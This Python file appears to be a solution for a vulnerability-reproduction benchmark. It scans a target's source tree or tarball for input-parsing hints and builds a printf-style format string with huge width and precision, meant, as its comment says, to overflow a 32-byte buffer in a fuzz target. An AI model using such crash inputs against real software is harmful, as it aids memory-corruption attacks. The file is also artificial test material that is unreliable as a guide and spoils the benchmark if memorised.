import os
import re
import tarfile
from typing import Iterator, Tuple, Optional


class Solution:
    _TEXT_EXTS = {
        ".c", ".cc", ".cpp", ".cxx",
        ".h", ".hh", ".hpp", ".hxx",
        ".m", ".mm",
        ".l", ".y",
        ".inc", ".inl",
        ".s", ".S",
        ".py", ".sh", ".pl", ".rb",
        ".txt", ".md", ".rst",
        ".cmake", ".mk",
    }

    def _iter_source_texts_from_dir(self, root: str) -> Iterator[Tuple[str, str]]:
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                path = os.path.join(dirpath, fn)
                try:
                    st = os.stat(path)
                except OSError:
                    continue
                if st.st_size <= 0 or st.st_size > 5_000_000:
                    continue
                _, ext = os.path.splitext(fn)
                ext = ext.lower()
                if ext not in self._TEXT_EXTS and fn.lower() not in ("makefile", "configure", "cmakelists.txt"):
                    continue
                try:
                    with open(path, "rb") as f:
                        data = f.read()
                except OSError:
                    continue
                if b"\x00" in data:
                    continue
                try:
                    txt = data.decode("utf-8", errors="ignore")
                except Exception:
                    continue
                if txt:
                    yield path, txt

    def _iter_source_texts_from_tar(self, tar_path: str) -> Iterator[Tuple[str, str]]:
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isreg():
                        continue
                    if m.size <= 0 or m.size > 5_000_000:
                        continue
                    name = m.name
                    base = os.path.basename(name)
                    _, ext = os.path.splitext(base)
                    ext = ext.lower()
                    if ext not in self._TEXT_EXTS and base.lower() not in ("makefile", "configure", "cmakelists.txt"):
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                    except Exception:
                        continue
                    if not data or b"\x00" in data:
                        continue
                    try:
                        txt = data.decode("utf-8", errors="ignore")
                    except Exception:
                        continue
                    if txt:
                        yield name, txt
        except Exception:
            return

    def _iter_source_texts(self, src_path: str) -> Iterator[Tuple[str, str]]:
        if os.path.isdir(src_path):
            yield from self._iter_source_texts_from_dir(src_path)
        else:
            yield from self._iter_source_texts_from_tar(src_path)

    def _analyze_input_style(self, texts: Iterator[Tuple[str, str]]) -> Tuple[bool, bool, str]:
        sscanf_re = re.compile(r'sscanf\s*\(\s*[^,]+,\s*"((?:\\.|[^"\\])*)"', re.MULTILINE)
        fscanf_re = re.compile(r'fscanf\s*\(\s*[^,]+,\s*"((?:\\.|[^"\\])*)"', re.MULTILINE)

        percent_literal_evidence = 0
        numeric_parse_evidence = 0
        spec_char_evidence = 0
        dot_literal_evidence = 0
        space_delim_evidence = 0

        for _, txt in texts:
            if "LLVMFuzzerTestOneInput" in txt:
                percent_literal_evidence += 2

            if "int_fmt" in txt and "[32]" in txt:
                percent_literal_evidence += 1

            if "precision" in txt and "width" in txt and "%" in txt:
                percent_literal_evidence += 1

            if "if" in txt and "'%'" in txt:
                percent_literal_evidence += 1

            for m in sscanf_re.finditer(txt):
                fmt = m.group(1)
                fmt_unesc = fmt.replace(r"\n", "\n").replace(r"\t", "\t").replace(r"\\", "\\").replace(r"\"", "\"")
                if "%%" in fmt_unesc:
                    percent_literal_evidence += 2
                if re.search(r"%(\d+)?(ll|l|z|j|t)?[duix]", fmt_unesc):
                    numeric_parse_evidence += 1
                if "%c" in fmt_unesc:
                    spec_char_evidence += 1
                if "." in fmt_unesc:
                    dot_literal_evidence += 1
                if re.search(r"%[0-9lLzjt]*[duix]\s+%[0-9lLzjt]*[duix]", fmt_unesc):
                    space_delim_evidence += 1

            for m in fscanf_re.finditer(txt):
                fmt = m.group(1)
                fmt_unesc = fmt.replace(r"\n", "\n").replace(r"\t", "\t").replace(r"\\", "\\").replace(r"\"", "\"")
                if "%%" in fmt_unesc:
                    percent_literal_evidence += 1
                if re.search(r"%(\d+)?(ll|l|z|j|t)?[duix]", fmt_unesc):
                    numeric_parse_evidence += 1
                if "%c" in fmt_unesc:
                    spec_char_evidence += 1
                if "." in fmt_unesc:
                    dot_literal_evidence += 1
                if re.search(r"%[0-9lLzjt]*[duix]\s+%[0-9lLzjt]*[duix]", fmt_unesc):
                    space_delim_evidence += 1

        include_percent = True
        if percent_literal_evidence == 0 and numeric_parse_evidence >= 3:
            include_percent = False

        include_spec = True
        if not include_percent and spec_char_evidence == 0:
            include_spec = False

        delim = "."
        if dot_literal_evidence == 0 and space_delim_evidence > 0:
            delim = " "

        return include_percent, include_spec, delim

    def solve(self, src_path: str) -> bytes:
        # Default robust payload: printf-style integer format with width and precision large enough to overflow 32-byte buffer.
        width = "1" * 15
        prec = "1" * 15

        texts = list(self._iter_source_texts(src_path))
        include_percent, include_spec, delim = self._analyze_input_style(iter(texts))

        if include_percent:
            if delim != ".":
                delim = "."
            if include_spec:
                s = "%" + width + delim + prec + "d"
            else:
                s = "%" + width + delim + prec
        else:
            if include_spec:
                s = width + delim + prec + "d"
            else:
                s = width + delim + prec

        return s.encode("ascii", errors="ignore")